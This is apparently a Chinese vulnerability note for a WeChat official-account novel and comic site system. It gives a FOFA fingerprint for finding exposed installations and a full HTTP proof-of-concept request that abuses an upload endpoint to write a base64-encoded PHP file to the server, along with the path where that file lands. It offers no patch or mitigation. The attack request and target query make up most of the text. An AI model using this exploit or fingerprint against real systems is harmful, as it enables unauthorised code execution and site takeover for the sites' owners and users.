# 微信公众号小说漫画系统前台任意文件写入漏洞

微信公众号小说漫画系统前台任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
"/Public/home/mhjs/jquery.js"
```

## poc

```javascript
POST /index.php?m=&c=IndexAjax&a=Upload HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 78
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; uloginid=107639
Host: 127.0.0.1
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/index.php?m=&c=IndexAjax
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
​
img=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg==&size=50
```



文件上传路径` /Public/webuploader/0.1.5/server/upload/1.php`

## 漏洞来源

- https://mp.weixin.qq.com/s/pJSx1c7kguryZs3x2KNpbQ



